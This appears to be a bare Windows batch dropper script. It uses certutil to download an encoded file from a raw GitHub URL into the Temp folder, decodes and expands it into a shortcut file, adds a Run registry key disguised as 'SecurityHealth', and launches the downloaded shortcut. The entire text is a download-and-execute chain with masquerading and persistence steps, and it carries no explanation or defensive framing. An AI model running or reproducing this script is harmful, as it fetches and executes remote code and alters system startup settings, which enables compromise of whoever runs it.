certutil -urlcache -split -f https://raw.githubusercontent.com/inwestallis/first_repository/master/exit.b %Temp%\exit.b
certutil -decode %Temp%\exit.b %Temp%\exit
expand %Temp%\exit %Temp%\gg.lnk
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d notepad.exe /f
start %Temp%\gg.lnk